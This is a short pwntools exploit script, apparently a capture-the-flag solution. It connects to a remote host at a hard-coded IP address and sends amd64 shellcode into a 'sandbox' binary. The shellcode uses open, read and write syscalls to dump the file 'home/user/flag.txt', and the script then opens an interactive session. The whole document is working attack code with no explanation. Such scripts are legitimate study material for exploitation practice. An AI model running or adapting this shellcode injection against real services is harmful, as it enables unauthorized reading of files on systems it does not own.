from pwn import *

exe = ELF("./sandbox", checksec=False)

# p = process(exe.path)

# p = remote('127.0.0.1', 1337)
p = remote('61.28.236.247', 33196)

context.arch = 'amd64'

shellcode = asm(
    """
    mov rbx, 0x7478
    push rbx

    mov rbx, 0x742e67616c662f72
    push rbx

    mov rbx, 0x6573752f656d6f68
    push rbx
    
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2                    # syscall: open
    syscall

    mov rdi, rax                  # rdi = fd
    mov rsi, rsp                  # rsi = buffer
    mov rdx, 0x100                # rdx = length
    xor rax, rax                  # syscall: read (rax = 0)
    syscall

    mov rdi, 1                    # rdi = stdout
    mov rax, 1                    # syscall: write
    syscall
    """, arch='amd64'
)

p.sendlineafter(': ', shellcode)
output = p.recvall(timeout=3)
print(output.decode(errors="ignore"))

p.interactive()